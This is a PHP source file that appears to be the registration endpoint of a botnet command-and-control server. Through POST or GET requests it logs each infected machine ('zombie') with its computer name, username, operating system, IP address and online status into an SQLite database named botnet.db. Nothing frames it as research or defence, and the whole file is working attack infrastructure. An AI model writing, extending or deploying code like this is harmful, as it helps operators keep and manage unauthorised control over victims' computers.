<?php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $pcName = $_POST["pcName"];
    $username = $_POST["username"];
    $os = $_POST["os"];
    $stat = "Online";
    $ip = $_SERVER['REMOTE_ADDR'];

    try {
        $db = new PDO('sqlite:/var/www/html/C2WebServer/botnet.db');
        $stmt = $db->prepare("INSERT INTO zombies (pcName, stat ,ip, username, os) VALUES (?, ?, ?, ?, ?)");
        $result = $stmt->execute([$pcName, $stat, $ip, $username, $os]);

    } catch (PDOException $e) {
    }
    
}

if ($_SERVER['REQUEST_METHOD'] == "GET"){
    $pcName = $_GET["pcName"];
    $username = $_GET["username"];
    $os = $_GET["os"];
    $stat = "Online";
    $ip = $_SERVER['REMOTE_ADDR'];

    try {
        $db = new PDO('sqlite:/var/www/html/C2WebServer/botnet.db');
        $stmt = $db->prepare("INSERT INTO zombies (pcName, stat ,ip, username, os) VALUES (?, ?, ?, ?, ?)");
        $result = $stmt->execute([$pcName, $stat, $ip, $username, $os]);

    } catch (PDOException $e) {
    }

}
?>